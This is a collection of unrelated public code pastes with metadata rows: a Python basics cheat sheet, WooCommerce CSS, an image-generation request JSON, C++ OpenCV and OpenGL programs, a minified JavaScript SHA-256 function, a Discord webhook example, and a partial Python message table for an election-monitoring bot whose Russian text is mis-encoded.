# range()
# pow()
# type() # print(type(myVar).__name__)
# list()
# str()
# int()
# float()
# len()
# sum()
# min()
# max()
# enumerate()
# open()
# round() # cousins math.ceil(), math.floor()
# abs() # math.fabs(), ""magnitude""
# help()
# dir() # # print(dir(str))
# help(str) # help(str.isspace)

# STRINGS
# be able to refer to indices, and slice
# myStr = ""abcdef""
# # mySlice[start:stop:step]
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
# "" "" # space from spacebar
# # a lot of Unicode spaces
# ""\n"" # new line return
# ""\t"" # tab
# ""\r"" # carriage return

# myVar = input().strip()

# unless otherwise stated... printed output should end a new line return... 99% of the time it does anyway
# print(""hey"") # --> print(""hey"", end=""\n"")
# we only need to change that when...
#1 ... this specific says to do something else
#2 ... you yourself overrode the end parameter of print() as the last thing you did... just call print() after that block

# STRING METHODS
# myStr.format() # ""Stuff I want to put this {} and {} together in a string"".format(val1, val2)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # ""remove"" myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # return index location
# myStr.count(subStr) # returns number of times it's there
# case: lower(), upper(), title(), capitalize()
# is/Boolean: isspace(), isupper(), islower(), isalpha(), isnumeric(), isdigit(), isalnum()
# myStr.startswith(subStr), endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# # -
# myList.pop(i) # last one or by index
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item) # returns int count of item
# myList.copy()
# myList.index(item)

# DICT
# use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key
# myDict[key] = value # assigns new value to key
#
# # DICT METHODS
# myDict.keys() # all dict keys in a set-like object
# myDict.values() # all dict values in a set-like object

# check if key in dict
# if ___ in myDict: # checking the keys

# MODULES
# math and csv

# MATH MODULE
# import math # FULL IMPORT
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y)
# math.fabs(x)
# math.pi
# math.e
#
# # PARTIAL IMPORT
# from math import ceil # just ceil(), no math.
# from math import factorial, sqrt # factorial(), sqrt()
# from math import * # floor(), sqrt()
#
# # ALIAS IMPORT
# import math as m
# m.floor(), m.ceil()

# FILES
# modes: r, w, a

# READ MODE
# filename = input()
with open(""test.txt"", ""r"") as f:
    # f.read()  # returns whole file as one big string
    # f.readline() # singular! I stay away from this one
    # f.readlines()  # returns a list of strings, line by line
    # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
    contents = f.readlines()
# print(contents)
# for line in contents:
#     line = line.strip()
#     print(line)

# CSV module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    # contents = f1.readlines()
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"")

# print(contents)

# WRITE MODE
# with open(""output_data35.csv"", ""w"") as f2:
#     # write out a file from contents where emails are from Yahoo
#     for row in contents:
#         # email is row[3]
#         if row[3].endswith(""@yahoo.com""):
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")

"
qbQyMYEh,Untitled,s-sols,CSS,Saturday 16th of March 2024 05:05:51 PM CDT,"body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper {
	position: relative;
	overflow: visible !important;
	width: 100% !important;
	--thmb-height: 65px;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:first-of-type .attachment-shop_thumbnail {
	aspect-ratio: 5 / 6;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(1n + 2) {
	position: absolute;
	left: -70px;
	top: -0%;
	width: 55px !important;
	height: auto;
	padding: 5px 0;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(2) {
	padding-top: 0;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(3) {
	top: calc(var(--thmb-height) * 1);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(4) {
	top: calc(var(--thmb-height) * 2);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(5) {
	top: calc(var(--thmb-height) * 3);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(6) {
	top: calc(var(--thmb-height) * 4);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(7) {
	top: calc(var(--thmb-height) * 5);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(8) {
	top: calc(var(--thmb-height) * 6);
}


body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(1n + 2) .attachment-shop_thumbnail {
	aspect-ratio: 1 / 1;
	object-fit: cover;
	border: 1px solid #d9d9d9;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery .flex-control-nav.flex-control-thumbs {
	opacity: 1 !important;
}
"
3cef2pUg,Untitled,alastair87,JSON,Saturday 16th of March 2024 04:49:42 PM CDT,"{
    ""numOutputsTotal"": 1,
    ""seed"": 3428304345,
    ""reqBody"": {
        ""prompt"": ""Madame Web, a wise old spider woman, with intricate webs covering her body, detailed face with multiple eyes, elegant spinnerets, glistening fangs, realistic fur and texture, photorealistic, expertly lit, 4k quality"",
        ""negative_prompt"": ""ugly, low resolution, bad anatomy, too many fingers, extra arms, extra legs, boring graphics, poor lighting, dark, cartoons, childish, simple, no details, unrealistic, (worst quality, low quality), deformed, grotesque, (3d, 2d painting, illustration), black and white"",
        ""active_tags"": [],
        ""inactive_tags"": [],
        ""width"": 1024,
        ""height"": 1024,
        ""seed"": 3428304345,
        ""num_inference_steps"": 25,
        ""guidance_scale"": 7.5,
        ""preserve_init_image_color_profile"": false,
        ""use_upscale"": ""RealESRGAN_x4plus"",
        ""upscale_amount"": ""4"",
        ""latent_upscaler_steps"": ""10"",
        ""sampler_name"": ""euler_a"",
        ""use_stable_diffusion_model"": ""civitai/sdxl-unstable-diffusers-yamermix"",
        ""clip_skip"": false,
        ""tiling"": ""none"",
        ""use_vae_model"": """",
        ""use_controlnet_model"": """",
        ""control_filter_to_apply"": """",
        ""use_lora_model"": [],
        ""lora_alpha"": [],
        ""num_outputs"": 1,
        ""stream_image_progress"": false,
        ""show_only_filtered_image"": true,
        ""output_format"": ""jpeg""
    }
}"
E2Ue3FCk,For https://stackoverflow.com/q/78171957/3962537,dan-masek,C++,Saturday 16th of March 2024 04:36:36 PM CDT,"#include <chrono>

#include <opencv2/opencv.hpp>

// ===================================================================

namespace original {

double CalculateCriteria(const cv::Mat& im, int th)
{
    cv::Mat thresholdedIm = cv::Mat::zeros(im.size(), CV_64F);
    thresholdedIm.setTo(1, im >= th);

    double nbPixels = static_cast<double>(im.total());
    double nbPixels1 = cv::countNonZero(thresholdedIm);
    double weight1 = nbPixels1 / nbPixels;
    double weight0 = 1 - weight1;

    if (weight1 == 0 || weight0 == 0) {
        return std::numeric_limits<double>::infinity();
    }

    cv::Mat valPixels1, valPixels0;
    im.copyTo(valPixels1, thresholdedIm == 1);
    im.copyTo(valPixels0, thresholdedIm == 0);

    cv::Scalar mean1, stdDev1, mean0, stdDev0;
    cv::meanStdDev(valPixels1, mean1, stdDev1);
    cv::meanStdDev(valPixels0, mean0, stdDev0);

    double var1 = stdDev1[0] * stdDev1[0];
    double var0 = stdDev0[0] * stdDev0[0];

    return weight0 * var0 + weight1 * var1;
}

cv::Mat SelectThreshold(const cv::Mat& img)
{
    int maxVal = 255;
    std::vector<double> criterias;
    for (int th = 0; th <= maxVal; ++th) {
        criterias.push_back(original::CalculateCriteria(img, th));
    }

    auto minElement = std::min_element(criterias.begin(), criterias.end());
    int bestThreshold = static_cast<int>(std::distance(criterias.begin(), minElement));

    cv::Mat binary;
    cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

    return binary;
}

} // namespace original

// ===================================================================

namespace dans1 {

    double CalculateCriteria(const cv::Mat& im, int th)
    {
        cv::Mat thresholdedIm = (im >= th);

        double nbPixels = static_cast<double>(im.total());
        double nbPixels1 = cv::countNonZero(thresholdedIm);
        double weight1 = nbPixels1 / nbPixels;
        double weight0 = 1 - weight1;

        if (weight1 == 0 || weight0 == 0) {
            return std::numeric_limits<double>::infinity();
        }

        cv::Mat valPixels1, valPixels0;
        im.copyTo(valPixels1, thresholdedIm);
        im.copyTo(valPixels0, ~thresholdedIm);

        cv::Scalar mean1, stdDev1, mean0, stdDev0;
        cv::meanStdDev(valPixels1, mean1, stdDev1);
        cv::meanStdDev(valPixels0, mean0, stdDev0);

        double var1 = stdDev1[0] * stdDev1[0];
        double var0 = stdDev0[0] * stdDev0[0];

        return weight0 * var0 + weight1 * var1;
    }

    cv::Mat SelectThreshold(const cv::Mat& img)
    {
        int maxVal = 255;
        std::vector<double> criterias;
        for (int th = 0; th <= maxVal; ++th) {
            criterias.push_back(dans1::CalculateCriteria(img, th));
        }

        auto minElement = std::min_element(criterias.begin(), criterias.end());
        int bestThreshold = static_cast<int>(std::distance(criterias.begin(), minElement));

        cv::Mat binary;
        cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

        return binary;
    }

} // namespace original

// ===================================================================
namespace dans2 {

cv::Mat SelectThreshold(const cv::Mat& img)
{
    int const histSize = 256;
    float range[] = { 0, 256 };
    const float* histRange[] = { range };

    cv::Mat hist;
    cv::calcHist(&img, 1, 0, cv::Mat(), hist, 1, &histSize, histRange, true, false);
    hist.convertTo(hist, CV_64FC1);

    cv::Mat hist_sums = hist.clone();
    for (int i(0); i < histSize; ++i) {
        hist_sums.at<double>(i) *= i;
    }

    cv::Mat hist_rcumm = hist.clone();
    cv::Mat hist_sums_rcumm = hist_sums.clone();

    for (int i(histSize); i > 0; --i) {
        hist_rcumm.at<double>(i - 1) += hist_rcumm.at<double>(i);
        hist_sums_rcumm.at<double>(i - 1) += hist_sums_rcumm.at<double>(i);
    }

    cv::Mat means1 = hist_sums_rcumm / img.total();
    cv::Mat means0 = (hist_sums_rcumm.at<double>(0) - hist_sums_rcumm) / img.total();

    cv::Mat var0 = cv::Mat::zeros(histSize, 1, CV_64FC1);
    cv::Mat var1 = cv::Mat::zeros(histSize, 1, CV_64FC1);
    for (int th(0); th < histSize; ++th) {
        double mean0 = means0.at<double>(th);
        double mean1 = means1.at<double>(th);
        for (int i(0); i < histSize; ++i) {
            if (i >= th) {
                var0.at<double>(th) += hist.at<double>(i) * (0 - mean0) * (0 - mean0);
                var1.at<double>(th) += hist.at<double>(i) * (i - mean1) * (i - mean1);
            } else {
                var0.at<double>(th) += hist.at<double>(i) * (i - mean0) * (i - mean0);
                var1.at<double>(th) += hist.at<double>(i) * (0 - mean1) * (0 - mean1);
            }
        }
    }

    var0 /= img.total();
    var1 /= img.total();

    cv::Mat weights1 = hist_rcumm / img.total();
    cv::Mat weights0 = 1 - weights1;

    cv::Mat criterias = weights0.mul(var0) + weights1.mul(var1);

    cv::Point minLoc;
    cv::minMaxLoc(criterias, nullptr, nullptr, &minLoc);
    double const bestThreshold = minLoc.y;

    cv::Mat binary;
    cv::threshold(img, binary, bestThreshold, 255, cv::THRESH_BINARY);

    return binary;
}

} // namespace dans2

// ===================================================================

int main(int argc, const char* argv[])
{
    cv::Mat src_img = cv::imread(""sudoku.png"", cv::IMREAD_GRAYSCALE);

    cv::Mat result_img, result_img2, result_img3;

    std::vector<size_t> times, times2, times3;
    for (int i = 0; i < 16; ++i) {
        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img = original::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times.push_back(duration.count());
        }

        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img2 = dans1::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times2.push_back(duration.count());
        }

        {
            auto start_t = std::chrono::high_resolution_clock::now();
            result_img3 = dans2::SelectThreshold(src_img);
            auto end_t = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_t - start_t);
            times3.push_back(duration.count());
        }
    }

    std::sort(times.begin(), times.end());
    std::sort(times2.begin(), times2.end());
    std::sort(times3.begin(), times3.end());

    std::cout << times[0] << ""   "" << times2[0] << ""   "" << times3[0] << ""\n"";

    cv::Mat delta2, delta3;
    cv::absdiff(result_img, result_img2, delta2);
    cv::absdiff(result_img, result_img3, delta3);
    std::cout << cv::countNonZero(delta2) << "" "" << cv::countNonZero(delta3) << ""\n"";
}
"
Mx1MLkMT,tmp,maxim_shlyahtin,C++,Saturday 16th of March 2024 04:23:17 PM CDT,"#include <Windows.h> //Don't worry about this; it's needed to make GL.h work properly on Windows only (and then, only sometimes).
//#include <GL/glew.h>
#include <GL/GL.h>
#include <GL/GLU.h>
#include ""ode.cpp""
//#include <glm.hpp>
#include <chrono>
#include <iomanip>
#include <thread>
#include <mutex>

#define _USE_MATH_DEFINES

//Choose whether to use SDL1 or SDL2

#include <cstdio>
#include <SDL.h>
#include <SDL_opengl.h>
#pragma comment(lib,""SDL2.lib"")
#pragma comment(lib,""SDL2main.lib"")
static SDL_Window* window;
static SDL_Renderer* renderer;
#pragma comment(lib,""opengl32.lib"")
#pragma comment(lib,""glu32.lib"")


static int const screen_size[2] = { 800, 600 };

using glf = GLfloat;
using point3d = std::vector<glf>;

double camX = 0.0;
double camY = 0.0;
double R = 10.0;
double t;
double h = 0.002;
size_t dist = 10;

TA attractor(3);
std::vector<double> init_state = { 0, 1, 0 };
std::vector<point3d> points;
std::vector<point3d> buffer;
double next_b = attractor.b + 0.01;

void set_attr(TA& attr, std::vector<double> init) {
    attr.SetInit(0, init);
}



Uint32 callback(Uint32 interval, void* name) {
    double dt = interval / 100.0;
    // Get the current time point
    std::chrono::time_point<std::chrono::high_resolution_clock> tp = std::chrono::high_resolution_clock::now();

    // Convert the time point to a duration in microseconds (or any other unit you prefer)
    std::chrono::duration<double, std::micro> dur = tp.time_since_epoch();

    // Get the count of the duration as a double
    t = dur.count();

    camX = R * cos((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    camY = R * sin((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    attractor.NextStep(dt);
    return interval;
}

TA attractor2 = attractor;

Uint32 CalcNextBfunc(Uint32 interval, void* name) {
    glf x = static_cast<glf>(attractor2.getX(0));
    glf y = static_cast<glf>(attractor2.getX(1));
    glf z = static_cast<glf>(attractor2.getX(2));
    attractor2.NextStep(h);
    return interval;
}

static bool get_input(void) {
    SDL_Event event;
    while (SDL_PollEvent(&event)) {
        switch (event.type) {
        case SDL_QUIT: return false; //The little X in the window got pressed
        case SDL_KEYDOWN:
            if (event.key.keysym.sym == SDLK_ESCAPE) {
                return false;
            }
            break;
        }
    }
    return true;
}
static void draw(void) {
    //Clear the screen's color and depth (default color is black, but can change with glClearColor(...))
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    //Drawing to an area starting at the bottom left, screen_size[0] wide, and screen_size[1] high.
    glViewport(0, 0, screen_size[0], screen_size[1]);
    //OpenGL is a state machine.  Tell it that future commands changing the matrix are to change OpenGL's projection matrix
    glMatrixMode(GL_PROJECTION);
    //Reset the projection matrix
    glLoadIdentity();
    //Multiply a perspective projection matrix into OpenGL's projection matrix
    gluPerspective(45.0, (double)(screen_size[0]) / (double)(screen_size[1]), 0.1, 100.0);

    //Tell OpenGL that future commands changing the matrix are to change the modelview matrix
    glMatrixMode(GL_MODELVIEW);
    //Reset the modelview matrix
    glLoadIdentity();
    //Multiply OpenGL's modelview matrix with a transform matrix that simulates a camera at (2,3,4) looking towards the location (0,0,0) with up defined to be (0,1,0)
    glf cameraX = static_cast<glf>(camX);
    glf cameraY = static_cast<glf>(camY);
    gluLookAt(cameraX, cameraY, 10.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);
    //gluLookAt(-20.0f, -15.0f, 20.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);

    //Begin drawing triangles.  Every subsequent triplet of vertices will be interpreted as a single triangle.
    //  OpenGL's default color is white (1.0,1.0,1.0), so that's what color the triangle will be.
    //glColor3f(1.0f, 1.0f, 1.0f);

    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    points.push_back({ x, y, z });
    //points_reverse.push_back({ x, y, z });
    //points_reverse.insert(points_reverse.begin(), {x, y, z});
    //std::reverse(points_reverse.begin(), points_reverse.end());
    glColor3f(1.0f, 1.0f, 1.0f); // Set the color to white
    glBegin(GL_POINTS);
    size_t number_of_points = points.size() - 1 > 0 ? points.size() - 1 : 1;
    //std::cout << number_of_points << "" time taken (in seconds): "" << std::fixed << t / 1000000.0  << '\n';
    for (size_t i = 0; i < number_of_points; i++) {
        if ((number_of_points - i) % dist == 0) {
            //tmp.push_back(number_of_points - i);
            glVertex3f(points[i].at(0), points[i].at(1), points[i].at(2));
        }
    }

    glEnd();
    SDL_GL_SwapWindow(window);

    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
}

int main(int argc, char* argv[]) {
    set_attr(attractor, init_state);
    //Initialize everything, but don't catch fatal signals; give them to the OS.
    SDL_Init(SDL_INIT_EVERYTHING | SDL_INIT_NOPARACHUTE);


    //Creates the window
    window = SDL_CreateWindow(""SDL and OpenGL example - Ian Mallett"", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, screen_size[0], screen_size[1], SDL_WINDOW_OPENGL);
    //Create an OpenGL context.  In SDL 1, this was done automatically.
    SDL_GLContext context = SDL_GL_CreateContext(window);

    //We now have an OpenGL context, and can call OpenGL functions.

    //Objects need to test each other to see which one is in front.  If you don't do this, you'll ""see through"" things!
    glEnable(GL_DEPTH_TEST);

    SDL_TimerID timerID = SDL_AddTimer(20, callback, const_cast<char*>(""SDL""));
    //std::thread CalculateNextB(&CalcNextBfunc, attractor2);
    //SDL_TimerID timerID1 = SDL_AddTimer(20, CalcNextBfunc, )

    //Main application loop
    int c = 0;
    auto start = std::chrono::steady_clock::now();
    while (true) {
        if (!get_input()) break;
        draw();
        c++;
        if (c % 1000 == 0) {
            attractor.b += 0.01;
        }
        if (c == 20000) {
            auto end = std::chrono::steady_clock::now();
            std::cout << ""Elapsed time in seconds: ""
                << std::chrono::duration_cast<std::chrono::seconds>(end - start).count()
                << "" sec"";
        }
    }

    //TA::Test();

    SDL_RemoveTimer(timerID);

    //Clean up
    //CalculateNextB.join();
    SDL_GL_DeleteContext(context);
    SDL_DestroyWindow(window);
    SDL_Quit();

    //Return success; program exits
    return 0;
}"
c76x96d1,Compact VanillaJS SHA256 Function,FAT_Scripts,JavaScript,Saturday 16th of March 2024 04:17:37 PM CDT,"function sha256($){function x($,x){let f=(65535&$)+(65535&x);return($>>16)+(x>>16)+(f>>16)<<16|65535&f}function f($,x){return $>>>x|$<<32-x}function e($,x){return $>>>x}function _($,x,f){return $&x^~$&f}function c($,x,f){return $&x^$&f^x&f}function a($){return f($,2)^f($,13)^f($,22)}function r($){return f($,6)^f($,11)^f($,25)}function n($){var x;return f($,7)^f($,18)^(x=$)>>>3}function t($){var x;return f($,17)^f($,19)^(x=$)>>>10}let b=function $(x){let f=[];for(let e=0;e<8*x.length;e+=8)f[e>>5]|=(255&x.charCodeAt(e/8))<<24-e%32;return f}(function $(x){x=x.replace(/\r\n/g,""\n"");let f="""";for(let e=0;e<x.length;e++){let _=x.charCodeAt(e);_<128?f+=String.fromCharCode(_):_>127&&_<2048?(f+=String.fromCharCode(_>>6|192),f+=String.fromCharCode(63&_|128)):(f+=String.fromCharCode(_>>12|224),f+=String.fromCharCode(_>>6&63|128),f+=String.fromCharCode(63&_|128))}return f}($)),o=function $(f,e){let _=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298,],b=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],o=Array(64),d,u,h,l,i,C,g,m,A,v,p,s;for(f[e>>5]|=128<<24-e%32,f[(e+64>>9<<4)+15]=e,A=0;A<f.length;A+=16){for(v=0,d=b[0],u=b[1],h=b[2],l=b[3],i=b[4],C=b[5],g=b[6],m=b[7];v<64;v++){var j,k,q;v<16?o[v]=f[v+A]:o[v]=x(x(x(t(o[v-2]),o[v-7]),n(o[v-15])),o[v-16]),p=x(x(x(x(m,r(i)),(j=i,k=C,j&k^~j&(q=g))),_[v]),o[v]),s=x(a(d),c(d,u,h)),m=g,g=C,C=i,i=x(l,p),l=h,h=u,u=d,d=x(p,s)}b[0]=x(d,b[0]),b[1]=x(u,b[1]),b[2]=x(h,b[2]),b[3]=x(l,b[3]),b[4]=x(i,b[4]),b[5]=x(C,b[5]),b[6]=x(g,b[6]),b[7]=x(m,b[7])}return b}(b,8*$.length);return function $(x){let f=""0123456789abcdef"",e="""";for(let _=0;_<4*x.length;_++)e+=f.charAt(x[_>>2]>>(3-_%4)*8+4&15)+f.charAt(x[_>>2]>>(3-_%4)*8&15);return e}(o)}"
sQCW4W2B,Generic Discord JS Webhook,FAT_Scripts,JavaScript,Saturday 16th of March 2024 04:12:31 PM CDT,"// Configuration for Discord Announcement
const Settings = {
    AvatarURL: '', // Optional: URL of the avatar image
    Name: 'Webhook Bot Name', // Display name of the bot
    Webhook: 'https://example.com', // Your Discord webhook URL
};

// Usage
// sendDiscordMessage();

// Send the formatted Discord message
function sendDiscordMessage(fields = []) {
    const request = new XMLHttpRequest();
    request.open('PUT', Settings.Webhook);
    request.setRequestHeader('Content-type', 'application/json');

    const messageContent = {
        username: Settings.Name,
        avatar_url: Settings.AvatarURL,
        content: `**Exciting News!**`,
        embeds: [{
            title: 'üéâ It Works! üéâ',
            color: 0x00FFFF, // Light blue color
            image: {},
            thumbnail: {},
            footer: { text: 'Much Wow' },
            fields: fields
        }],
    };

    request.send(JSON.stringify(messageContent));
}
"
Dg0Lf8BQ,Untitled,nclopezo,Python,Saturday 16th of March 2024 04:10:03 PM CDT,"""""""
Module that defines an enumeration with the messages that the bot can send
""""""
import os

from enum import Enum


class BotMessages(Enum):
    ENGLISH = {
        'PLEASE_SEND_A_PHOTO':
            'Please send a photo to the bot. Thank you',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            'The photo has been received successfully! Thank you!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            'You have already sent too many photos to the bot. ',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            'You have already sent too many photos to the bot in the last hour.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            'The photo contains inappropiate content. Please send another photo.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            'The photo does not look like a document. Please send another photo.',
        'NOT_IN_WORKING_DATES':
            'The bot is not available at the moment. Please try again during the activation times.',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            'Please provide the site ID and region separated by a comma. Thank you.',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site and region id.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
            'Please provide the number of portable and stationary boxes separated by a comma (7 and 8), for example: '
            '1,2. Thank you.',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            'Invalid numbers please write the numbers separated by comma, for example: 1,2. ',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            'Please provide the number of invalid and valid ballots separated by a comma (9 and 10), '
            'for example: 1,2. Thank you.',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            'Invalid numbers, please write the numbers separated by comma, for example: 1,2.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            'Please provide the number of ballots in favor. Thank you. (13 to 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            'The numbers are not coherent. Please provide the numbers again.',
        'THE_NUMBERS_ARE_COHERENT':
            'The numbers are correct. Thank you! Please now send a photo of the protocol.',
    }
    RUSSIAN = {
        'PLEASE_SEND_A_PHOTO':
            '–ü—Ä–∏–ª–æ–∂–∏—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é –ø—Ä–æ—Ç–æ–∫–æ–ª–∞. –°–ø–∞—Å–∏–±–æ.',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            '–§–æ—Ç–æ–≥—Ä–∞—Ñ–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω–∞! –°–ø–∞—Å–∏–±–æ!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            '–û—Ç –í–∞—Å –ø–æ—Å—Ç—É–ø–∏–ª–æ —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π.',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            '–û—Ç –í–∞—Å –ø–æ—Å—Ç—É–ø–∏–ª–æ —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–π —á–∞—Å.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            '–≠—Ç–∞ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—è –Ω–µ –ø–æ—Ö–æ–∂–∞ –Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç. –ó–∞–º–µ–Ω–∏—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            '–≠—Ç–∞ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—è –Ω–µ –ø–æ—Ö–æ–∂–∞ –Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç. –ó–∞–º–µ–Ω–∏—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é.',
        'NOT_IN_WORKING_DATES':
            '–í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–æ–∫ –µ—â—ë –Ω–µ –ø—Ä–∏—à–ª–æ. –ñ–¥–∏—Ç–µ –¥–æ 22.00 17.03.2024 –ø–æ –º–æ—Å–∫–æ–≤—Å–∫–æ–º—É –≤—Ä–µ–º–µ–Ω–∏',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏–∑–±–∏—Ä–∞—Ç–µ–ª—å–Ω–æ–≥–æ —É—á–∞—Å—Ç–∫–∞ –∏ –Ω–æ–º–µ—Ä —Å—É–±—ä–µ–∫—Ç–∞ —Ñ–µ–¥–µ—Ä–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site ID.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
